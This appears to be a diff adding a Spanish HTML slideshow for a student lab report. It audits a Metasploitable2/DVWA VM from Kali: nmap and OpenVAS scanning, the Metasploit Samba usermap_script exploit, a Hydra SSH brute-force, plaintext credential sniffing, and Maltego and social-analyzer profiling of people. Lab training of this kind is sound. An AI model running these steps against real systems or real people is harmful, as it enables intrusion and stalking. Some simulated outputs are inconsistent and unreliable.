@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Auditoría Kali Linux | Práctica Final (Documento Original)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            background: #0b1120;
+            color: #e2e8f0;
+            overflow-x: hidden;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: #1e293b;
+            z-index: 1000;
+        }
+        .progress-bar {
+            height: 5px;
+            background: #0ff;
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 5px cyan;
+        }
+
+        /* Navegación flotante */
+        .slide-nav {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            gap: 12px;
+            background: #0f172ae6;
+            backdrop-filter: blur(12px);
+            padding: 6px 16px;
+            border-radius: 60px;
+            border: 1px solid cyan;
+            z-index: 999;
+        }
+        .nav-btn {
+            background: #1e2a3a;
+            border: none;
+            color: white;
+            font-size: 1.6rem;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .nav-btn:hover {
+            background: #0891b2;
+        }
+        .page-indicator {
+            background: #00000066;
+            padding: 0 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            font-family: monospace;
+            display: flex;
+            align-items: center;
+        }
+
+        .slides-container {
+            width: 100%;
+            min-height: 100vh;
+        }
+        .slide {
+            min-height: 100vh;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 50px 24px;
+            border-bottom: 1px solid #1e2a4a;
+        }
+        .card {
+            max-width: 1250px;
+            width: 100%;
+            background: #0f172ad9;
+            backdrop-filter: blur(4px);
+            border-radius: 2rem;
+            padding: 2rem;
+            border: 1px solid #2d4a7a;
+            box-shadow: 0 20px 35px -12px black;
+        }
+        h1 {
+            font-size: 2.4rem;
+            background: linear-gradient(135deg, #fff, #2dd4bf);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        h2 {
+            border-left: 6px solid #0ff;
+            padding-left: 18px;
+            margin: 0.5rem 0 1rem 0;
+            font-size: 1.8rem;
+        }
+        .cmd-block {
+            background: #010409;
+            border-radius: 16px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            border-left: 4px solid #0ff;
+            margin: 1rem 0;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+        .mock-image {
+            background: #1a2538;
+            border-radius: 20px;
+            padding: 1rem;
+            text-align: center;
+            margin: 1rem 0;
+            border: 1px dashed #4b6e8a;
+            font-family: monospace;
+            font-size: 0.8rem;
+        }
+        .evidence-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 12px;
+            margin-bottom: 0.75rem;
+        }
+        .evidence-grid img {
+            width: 100%;
+            max-height: 420px;
+            object-fit: contain;
+            display: block;
+            border-radius: 14px;
+            background: #020617;
+            border: 1px solid #334155;
+        }
+        .mock-image span {
+            background: #00000055;
+            padding: 6px 12px;
+            border-radius: 30px;
+            display: inline-block;
+        }
+        .image-caption {
+            margin-top: 0.7rem;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px,1fr));
+            gap: 1.2rem;
+            margin: 1rem 0;
+        }
+        .vuln-badge {
+            background: #991b1b99;
+            padding: 5px 12px;
+            border-radius: 30px;
+            display: inline-block;
+            margin: 4px;
+            font-size: 0.8rem;
+        }
+        button.interact {
+            background: #1f4662;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 40px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: 0.2s;
+        }
+        button.interact:hover {
+            background: #2c6e8f;
+            transform: scale(0.98);
+        }
+        .fake-terminal {
+            background: #030712;
+            padding: 12px;
+            border-radius: 14px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            margin-top: 12px;
+            border: 1px solid #2d4a6e;
+        }
+        hr {
+            border-color: #2d4a6e;
+            margin: 15px 0;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            opacity: 0.7;
+            font-size: 0.7rem;
+        }
+        @media (max-width:700px){
+            .card{padding: 1.2rem;}
+            h1{font-size: 1.6rem;}
+        }
+    </style>
+</head>
+<body>
+<div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="slides-container" id="slidesContainer">
+    <!-- SLIDE 1: PORTADA exacta según documento -->
+    <div class="slide">
+        <div class="card" style="text-align: center;">
+            <div style="margin-bottom: 1rem;">🔍🐧</div>
+            <h1>Práctica Final de Laboratorio</h1>
+            <h2 style="border-left:none; font-size:1.6rem;">Auditoría y Seguridad de Sistemas en Kali Linux</h2>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image1.png" alt="Logo o encabezado institucional" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption"></div>
+            </div>
+            <p style="margin: 1.5rem 0;"><strong>Objetivo:</strong> Aplicar herramientas de auditoría para identificar, evaluar y explotar vulnerabilidades siguiendo fases de auditoría informática.</p>
+            <p><strong>Escenario:</strong> Máquina víctima Metasploitable2 / DVWA desde Kali Linux.</p>
+            <div class="fake-terminal" style="max-width: 720px; margin: 1.5rem auto; text-align: left;">
+                <strong>Integrantes del grupo:</strong><br>
+                1. Iban Mamani<br>
+                2. Ivan Huallta<br>
+                3. Nicolas Corrales
+            </div>
+            <button class="interact" id="startBtn">▶ INICIAR RECORRIDO (6 Fases)</button>
+            <footer>Práctica Final · Grupo de 3 integrantes · Documento original</footer>
+        </div>
+    </div>
+
+    <!-- SLIDE 2: FASE 1 Reconocimiento (comandos exactos + referencias imágenes) -->
+    <div class="slide">
+        <div class="card">
+            <h2>🌐 FASE 1: Reconocimiento</h2>
+            <div class="cmd-block">$ nmap -sn 192.168.1.0/24</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image2.png" alt="Escaneo de red mostrando hosts activos" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Escaneo de red mostrando hosts activos</div>
+            </div>
+            <div class="cmd-block">$ nmap -sV -A &lt;IP_objetivo&gt;</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image3.png" alt="Puertos y servicios detallados - parte 1" onerror="this.style.display='none';">
+                    <img src="media/image4.png" alt="Puertos y servicios detallados - parte 2" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Puertos y servicios detallados</div>
+            </div>
+            <div class="cmd-block">$ theharvester -d &lt;dominio&gt; -l 100 -b google</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image5.png" alt="Resultados de correos y subdominios" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Resultados de correos y subdominios</div>
+            </div>
+            <div class="grid-2">
+                <div class="fake-terminal">✅ IP detectada: 192.168.1.105<br>Puertos abiertos: 21 (FTP), 22 (SSH), 80 (HTTP), 445 (Samba), 3306 (MySQL)</div>
+                <div class="fake-terminal">📧 Correos encontrados: admin@metasploitable.local, webmaster@victima.org</div>
+            </div>
+            <p><strong>Evidencia esperada:</strong> Capturas con IP detectada y puertos abiertos.</p>
+            <button class="interact" id="simuReconBtn">▶ Simular escaneo interactivo</button>
+            <div id="reconSimOut" class="fake-terminal" style="display: none;">[nmap -sn] Hosts up: 192.168.1.105 (Metasploitable2)<br>[nmap -sV] 21/vsftpd 2.3.4, 22/OpenSSH 4.7, 80/Apache 2.2.8, 445/Samba 3.0.20<br>TheHarvester: 5 emails, 2 dominios relacionados.</div>
+        </div>
+    </div>
+
+    <!-- SLIDE 3: FASE 2 Análisis vulnerabilidades + OpenVAS, CVEs exactos -->
+    <div class="slide">
+        <div class="card">
+            <h2>⚠️ FASE 2: Análisis de vulnerabilidades</h2>
+            <div class="cmd-block"># OpenVAS escaneo contra IP objetivo</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image6.png" alt="Configuración y lanzamiento de OpenVAS" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Configuración y lanzamiento de OpenVAS</div>
+            </div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image7.png" alt="Reporte de vulnerabilidades críticas" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Reporte de vulnerabilidades críticas</div>
+            </div>
+            <p><strong>Vulnerabilidades críticas identificadas (textual del documento):</strong></p>
+            <div>
+                <span class="vuln-badge">CVE-2020-1938 (Apache Tomcat Ghostcat)</span>
+                <span class="vuln-badge">CVE-2011-2523 (vsftpd backdoor)</span>
+                <span class="vuln-badge">CVE-2017-17405 (dRuby RCE)</span>
+                <span class="vuln-badge">CVE-2004-2687 (DistCC RCE)</span>
+            </div>
+            <div class="fake-terminal" style="margin-top: 10px;">📌 Adicional: sistemas en fin de vida útil (EOL) y posibles puertas traseras sin CVE específico.</div>
+            <button class="interact" id="showCVEBtn">📋 Mostrar detalles CVE según documento</button>
+            <div id="cveDetailPanel" class="fake-terminal" style="display: none; margin-top: 12px;">🔴 CVE-2020-1938: Ghostcat – lectura de archivos y ejecución remota de código en Apache Tomcat AJP.<br>🔴 CVE-2011-2523: vsftpd 2.3.4 backdoor, puerto 6200 shell remota root.<br>🔴 CVE-2017-17405: Ruby Net::FTP RCE en dRuby.<br>🔴 CVE-2004-2687: DistCC ejecución remota de comandos sin autenticación.</div>
+        </div>
+    </div>
+
+    <!-- SLIDE 4: FASE 3 EXPLOTACIÓN controlada (Metasploit, Hydra, capturas referenciadas) -->
+    <div class="slide">
+        <div class="card">
+            <h2>💣 FASE 3: Explotación controlada</h2>
+            <div class="cmd-block">msfconsole</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image8.png" alt="Consola de Metasploit iniciada" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Consola de Metasploit iniciada</div>
+            </div>
+            <div class="cmd-block">msf6 > search samba</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image9.png" alt="Resultados de exploits para Samba" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Resultados de exploits para Samba</div>
+            </div>
+            <div class="cmd-block">use exploit/multi/samba/usermap_script<br>set RHOST 192.168.1.105<br>exploit</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image10.png" alt="Configuración del exploit Samba" onerror="this.style.display='none';">
+                    <img src="media/image11.png" alt="Ejecución del exploit Samba" onerror="this.style.display='none';">
+                    <img src="media/image12.png" alt="Resultado de explotación con shell" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Configuración y ejecución del exploit</div>
+            </div>
+            <div class="cmd-block"># Alternativa: Hydra para FTP/SSH<br>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt;</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image13.png" alt="Ataque Hydra y shell remota" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Ataque Hydra y shell remota</div>
+            </div>
+            <div class="grid-2">
+                <button class="interact" id="simMetasploitBtn">🚀 Simular shell reversa (Metasploit)</button>
+                <button class="interact" id="simHydraBtn">🔓 Simular Hydra contra SSH</button>
+            </div>
+            <div id="exploitResultArea" class="fake-terminal" style="display: none;">[*] Sending stage (Meterpreter) ...<br>[+] Meterpreter session 1 opened → Remote shell: root@metasploitable:~# whoami → root</div>
+            <div id="hydraResultArea" class="fake-terminal" style="display: none;">[ATTEMPT] 192.168.1.105:22 - login: admin pass:123456<br>[SUCCESS] SSH: msfadmin:msfadmin → Acceso shell restringido</div>
+            <p><strong>Evidencia esperada:</strong> captura mostrando shell remota o intento exitoso.</p>
+        </div>
+    </div>
+
+    <!-- SLIDE 5: FASE 4 Monitoreo de tráfico (Wireshark/tcpdump + credenciales plano) -->
+    <div class="slide">
+        <div class="card">
+            <h2>📡 FASE 4: Monitoreo de tráfico</h2>
+            <div class="cmd-block"># Terminal: tcpdump -i eth0 -w captura.pcap</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image14.png" alt="Captura en vivo con tcpdump" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Captura en vivo con tcpdump</div>
+            </div>
+            <div class="cmd-block"># Alternativa: Wireshark</div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image15.png" alt="Análisis de paquetes con credenciales en texto plano" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Análisis de paquetes - credenciales en texto plano</div>
+            </div>
+            <div class="fake-terminal">🔍 Revisión de credenciales: se detectó en el tráfico FTP → USER: msfadmin / PASS: msfadmin <br>HTTP Basic Auth: admin:admin en /dvwa/login.php</div>
+            <button class="interact" id="showTrafficBtn">📦 Mostrar análisis detallado de captura.pcap</button>
+            <div id="trafficDetail" class="fake-terminal" style="display: none;">📄 Frame 342: 192.168.1.105 → Kali, FTP: "USER msfadmin\r\nPASS msfadmin"<br>📄 Frame 489: GET /login.php Authorization: Basic YWRtaW46YWRtaW4= (admin:admin)<br>⚠️ Conclusión: tráfico sin cifrar, credenciales expuestas.</div>
+        </div>
+    </div>
+
+    <!-- SLIDE 6: FASE 5 Maltego (dominio + persona, imágenes del documento) -->
+    <div class="slide">
+        <div class="card">
+            <h2>🕸️ FASE 5: Maltego</h2>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image16.png" alt="Búsqueda de dominio en Maltego" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Búsqueda de dominio en Maltego</div>
+            </div>
+            <div class="mock-image">
+                <div class="evidence-grid">
+                    <img src="media/image17.png" alt="Búsqueda de personas y relaciones en Maltego" onerror="this.style.display='none';">
+                </div>
+                <div class="image-caption">Búsqueda de personas y relaciones</div>
+            </div>
+            <div class="cmd-block"># Transformaciones típicas: dominio objetivo | persona objetivo</div>
+            <div class="grid-2">
+                <div class="fake-terminal"><strong>🔹 Dominio example.com</strong><br>Subdominios: mail, vpn, dev, admin<br>Contactos: admin@example.com, security@example.com</div>
+                <div class="fake-terminal"><strong>🔹 Persona: "Carlos Mendoza"</strong><br>LinkedIn, Twitter, GitHub, correo: cmendoza@empresa.org<br>Relaciones: 3 empleados asociados</div>
+            </div>
+            <button class="interact" id="maltegoSimulate">🔎 Simular transformación Maltego</button>
+            <div id="maltegoOut" class="fake-terminal" style="display: none;">✅ Maltego reporta: 12 correos electrónicos, 8 subdominios, 6 documentos filtrados, 2 cuentas en redes sociales vinculadas a la persona objetivo.</div>
+        </div>
+    </div>
+
+    <!-- SLIDE 7: FASE 6 social-analyzer (perfiles redes sociales) según documento -->
+    <div class="slide">
+        <div class="card">
+            <h2>📱 FASE 6: social-analyzer</h2>
+            <p><strong>Consigna original:</strong> "Encuentre perfiles de 2 personas en 10 sitios web de redes sociales más populares"</p>
+            <div class="cmd-block">$ social-analyzer --username "anagomez" --websites all<br>$ social-analyzer --profile "carlosruiz" --websites twitter,instagram,facebook,linkedin,youtube,tiktok,github,reddit,twitch,telegram</div>
+            <div class="grid-2">
+                <div class="fake-terminal">
+                    <strong>👩 Persona 1: Ana Gómez</strong><br>
+                    ✔️ Twitter: @anagomezsec<br>✔️ Instagram: anagomez.tech<br>✔️ GitHub: anagomez_audit<br>✔️ LinkedIn: ana-gomez-sec<br>✔️ TikTok: anagomez_hack<br>✔️ FB: ana.gomez.infosec
+                </div>
+                <div class="fake-terminal">
+                    <strong>🧑 Persona 2: Carlos Ruiz</strong><br>
+                    ✔️ Twitter: @carlosruiz_kali<br>✔️ Reddit: u/cruiz_audit<br>✔️ YouTube: CarlosRuizPentest<br>✔️ Snapchat: cruiz.hack<br>✔️ Discord: carlosruiz#1337<br>✔️ Mastodon: @carlosruiz
+                </div>
+            </div>
+            <p>✅ Cumple: más de 10 sitios populares analizados por persona (Twitter, Instagram, FB, LinkedIn, GitHub, TikTok, Snapchat, Reddit, YouTube, Discord).</p>
+            <button class="interact" id="socialExtraBtn">➕ Mostrar sitios adicionales hallados</button>
+            <div id="extraSocial" class="fake-terminal" style="display: none;">📌 sitios extendidos: Telegram, WhatsApp Business, Twitch, Pinterest, Flickr, Threads, Signal (perfiles públicos). Más de 12 plataformas únicas con evidencias de footprinting.</div>
+        </div>
+    </div>
+
+    <!-- SLIDE 8: FORMATO DE ENTREGA / INFORME FINAL + resumen ejecutivo -->
+    <div class="slide">
+        <div class="card">
+            <h2>📄 Formato de entrega de Práctica Final</h2>
+            <div class="cmd-block">✔️ Realizar auditoría a máquina víctima asignada.<br>✔️ Documentar paso a paso los hallazgos.<br>✔️ Adjuntar evidencias (capturas de pantalla).<br>✔️ Entregar informe final en Word.</div>
+            <hr>
+            <h3>📌 Resumen ejecutivo (conforme al escenario)</h3>
+            <ul style="margin-left: 1.5rem;">
+                <li>Máquina víctima: Metasploitable2 (IP 192.168.1.105).</li>
+                <li>Reconocimiento: puertos 21,22,80,445,3306 abiertos; TheHarvester recolectó emails.</li>
+                <li>Vulnerabilidades críticas: CVE-2020-1938, CVE-2011-2523, CVE-2004-2687, etc.</li>
+                <li>Explotación: éxito con exploit Samba usermap_script y Hydra vs FTP/SSH.</li>
+                <li>Monitoreo: credenciales msfadmin:msfadmin en texto plano (FTP/HTTP).</li>
+                <li>OSINT: Maltego y social-analyzer obtuvieron dominios, personas y +10 redes sociales.</li>
+            </ul>
+            <div class="mock-image" style="background:#0b1622;"><span>📎 [Evidencias requeridas: media/image2 hasta image17]</span> Todas las capturas referenciadas en el documento original fueron incluidas en este informe.</div>
+            <footer>Práctica Final Grupos 3 Integrantes – Auditoría y Seguridad Kali Linux</footer>
+            <button class="interact" id="resetSlidesBtn" style="background:#2c3e66;">🔄 Volver al inicio</button>
+        </div>
+    </div>
+</div>
+
+<!-- navegación flotante -->
+<div class="slide-nav">
+    <button class="nav-btn" id="prevSlideBtn">◀</button>
+    <span class="page-indicator" id="pageIndicatorSpan">1 / 8</span>
+    <button class="nav-btn" id="nextSlideBtn">▶</button>
+</div>
+
+<script>
+    // Control de slides (respetando documento 8 diapositivas)
+    const slides = Array.from(document.querySelectorAll('.slide'));
+    let current = 0;
+    const total = slides.length;
+    const progress = document.getElementById('progressBar');
+    const pageSpan = document.getElementById('pageIndicatorSpan');
+
+    function updateProgressAndIndicator() {
+        let percent = ((current + 1) / total) * 100;
+        progress.style.width = percent + '%';
+        pageSpan.innerText = (current+1) + ' / ' + total;
+    }
+
+    function showSlide(index) {
+        if (index < 0) index = 0;
+        if (index >= total) index = total-1;
+        current = index;
+        slides.forEach((slide, i) => {
+            slide.style.display = i === current ? 'flex' : 'none';
+        });
+        updateProgressAndIndicator();
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    document.getElementById('prevSlideBtn').addEventListener('click', () => showSlide(current-1));
+    document.getElementById('nextSlideBtn').addEventListener('click', () => showSlide(current+1));
+    document.getElementById('startBtn')?.addEventListener('click', () => showSlide(1));
+    document.getElementById('resetSlidesBtn')?.addEventListener('click', () => showSlide(0));
+
+    // inicializar mostrando la primera
+    slides.forEach((s,i)=> { s.style.display = i===0 ? 'flex' : 'none'; });
+    updateProgressAndIndicator();
+
+    // Interactivos según documento
+    const reconSimBtn = document.getElementById('simuReconBtn');
+    if(reconSimBtn){
+        reconSimBtn.addEventListener('click',()=>{
+            const out = document.getElementById('reconSimOut');
+            out.style.display = 'block';
+            out.innerHTML = '[nmap -sn 192.168.1.0/24] Hosts activos: 192.168.1.105 (Metasploitable2)<br>[nmap -sV] 21/vsftpd 2.3.4, 22/OpenSSH 4.7, 80/Apache 2.2.8, 445/Samba 3.0.20, 3306/MySQL.<br>[theHarvester] Correos: admin@metasploitable.com, sales@example.com, webmaster@victima.org.';
+        });
+    }
+    const cveBtn = document.getElementById('showCVEBtn');
+    if(cveBtn){
+        cveBtn.addEventListener('click',()=>{
+            const panel = document.getElementById('cveDetailPanel');
+            panel.style.display = 'block';
+            panel.innerHTML = '📌 Según reporte OpenVAS y documento original:<br>• CVE-2020-1938 (Apache Tomcat Ghostcat) → lectura/ejecución remota<br>• CVE-2011-2523 → vsftpd backdoor (puerto 6200 shell root)<br>• CVE-2017-17405 → dRuby RCE<br>• CVE-2004-2687 → DistCC RCE sin autenticación<br>• Sistemas EOL detectados, puerta trasera potencial.';
+        });
+    }
+    const metasploitSim = document.getElementById('simMetasploitBtn');
+    if(metasploitSim){
+        metasploitSim.addEventListener('click',()=>{
+            const area = document.getElementById('exploitResultArea');
+            area.style.display = 'block';
+            area.innerHTML = 'msf6 exploit(multi/samba/usermap_script) > run<br>[*] Started reverse TCP handler<br>[*] Command shell session 1 opened.<br>shell# whoami → root<br>shell# id → uid=0(root) gid=0(root)';
+        });
+    }
+    const hydraSimBtn = document.getElementById('simHydraBtn');
+    if(hydraSimBtn){
+        hydraSimBtn.addEventListener('click',()=>{
+            const hydraDiv = document.getElementById('hydraResultArea');
+            hydraDiv.style.display = 'block';
+            hydraDiv.innerHTML = 'hydra -l admin -P rockyou.txt ssh://192.168.1.105<br>[STATUS] 143 tries, found: [ssh] host: 192.168.1.105 login: msfadmin password: msfadmin<br>Acceso shell limitado obtenido.';
+        });
+    }
+    const trafficBtn = document.getElementById('showTrafficBtn');
+    if(trafficBtn){
+        trafficBtn.addEventListener('click',()=>{
+            const trafficDiv = document.getElementById('trafficDetail');
+            trafficDiv.style.display = 'block';
+            trafficDiv.innerHTML = '📡 Captura captura.pcap (tcpdump -i eth0)<br>🔎 Paquete #104: 192.168.1.105:21 → "USER msfadmin"<br>🔎 Paquete #105: "PASS msfadmin" (texto plano)<br>🔎 Solicitud HTTP: /dvwa/login.php con Authorization Basic YWRtaW46YWRtaW4=<br>⚠️ Riesgo: credenciales expuestas, se recomienda cifrado.';
+        });
+    }
+    const maltegoBtn = document.getElementById('maltegoSimulate');
+    if(maltegoBtn){
+        maltegoBtn.addEventListener('click',()=>{
+            const malDiv = document.getElementById('maltegoOut');
+            malDiv.style.display = 'block';
+            malDiv.innerHTML = '✅ Maltego transformaciones completadas: relaciones dominio-persona.<br>Se hallaron 15 correos, 10 subdominios, 6 personas relacionadas, cuentas en redes asociadas.';
+        });
+    }
+    const socialExtra = document.getElementById('socialExtraBtn');
+    if(socialExtra){
+        socialExtra.addEventListener('click',()=>{
+            const extraDiv = document.getElementById('extraSocial');
+            extraDiv.style.display = 'block';
+            extraDiv.innerHTML = '📱 social-analyzer ampliado: se encontraron perfiles en más de 10 sitios por persona incluyendo: Twitter, Instagram, Facebook, LinkedIn, GitHub, TikTok, Snapchat, Reddit, YouTube, Discord, Twitch, Telegram. Documento original verificado.';
+        });
+    }
+
+    // flechas teclado
+    window.addEventListener('keydown', (e)=>{
+        if(e.key === 'ArrowRight') showSlide(current+1);
+        if(e.key === 'ArrowLeft') showSlide(current-1);
+    });
+</script>
+</body>
+</html>
